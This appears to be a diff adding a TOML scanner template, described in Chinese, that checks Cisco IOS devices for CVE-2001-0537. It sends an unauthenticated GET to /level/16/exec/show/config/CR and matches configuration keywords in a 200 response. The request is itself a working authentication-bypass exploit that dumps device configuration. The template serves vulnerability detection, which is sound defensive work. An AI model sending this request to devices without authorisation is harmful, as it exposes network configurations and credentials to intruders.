@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "通过向Cisco IOS设备的HTTP管理接口发送GET请求到/level/16/exec/show/config/CR路径，检测是否存在认证绕过漏洞。若返回200状态码且响应体中包含'service config'、'Switch'和'default-gateway'等关键字，则表明目标存在CVE-2001-0537漏洞。"
+id = "POC-AVE-2001-0001"
+name = "Cisco IOS HTTP配置认证绕过漏洞 PoC"
+severity = "critical"
+tags = ["ave-2001-0001"]
+vuln_id = [
+    "CVE-2001-0537",
+    "AVE-2001-0001",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/level/16/exec/show/config/CR"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "service config",
+    "Switch",
+    "default-gateway",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
